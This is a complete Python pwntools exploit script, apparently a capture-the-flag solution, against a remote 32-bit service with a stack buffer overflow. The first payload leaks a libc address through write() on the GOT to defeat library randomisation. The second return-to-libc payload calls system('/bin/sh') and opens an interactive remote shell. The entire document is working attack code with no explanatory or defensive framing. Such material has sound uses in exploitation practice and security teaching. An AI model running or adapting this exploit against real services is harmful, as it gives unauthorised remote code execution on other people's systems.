from pwn import *
import sys

def main( host, port):
    try:
        c = remote(host,port)
    except:
        print('[ERROR] Failed to connect')
        sys.exit(0)

    ## The binary does is not randomized but the libraries are.
    ## We need to first leak a pointer using a call to write
    write = p32(0x0804830c)
    got = p32(0x08049614)

    readsub = p32(0x080483f4)

    ## Offset in libc to a /bin/sh string
    binsh = 0x0017b8cf

    ## Open the libc so that I can calculate the base given the leaked
    ##   write() address
    libc = ELF('/lib32/libc.so.6')

    write_libc = libc.symbols['write']
    system = libc.symbols['system']

    print('[INFO] write() libc: 0x%08x' %(write_libc))

    ## The destination buffer is at -0x88 from ebp
    ## 
    data = b'a'*0x88
    data += p32(0xdeadbeef)  ## ebp
    data += write  ## initial pc
    data += readsub  ## pc2 -- head back to read2 to get another overwrite
    data += p32(0) ## fd (stdin)
    data += got    ## pointer -- This is the address of the got
    data += p32(0x08) ## length to send back
    data += p32(0xcafebab9)
    data += b'\n'

    c.send(data)
    got_data = c.read(0x08)
    
    write_libc_addr = u32( got_data[0:4])
    libc_base = write_libc_addr - write_libc

    print('[INFO] leaked write() 0x%08x' %(write_libc_addr))
    print('[INFO] libc base: 0x%08x' %(libc_base))

    data = b'a'*0x88
    data += p32(0xdeadbeef)  ## ebp
    data += p32(libc_base + system)  ## initial pc
    data += p32(libc_base + libc.symbols['exit']) ## exit cleanly
    data += p32(libc_base + binsh)
    data += b'\n'
    c.send(data)

    c.interactive()
    c.close()
    sys.exit(0)

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])
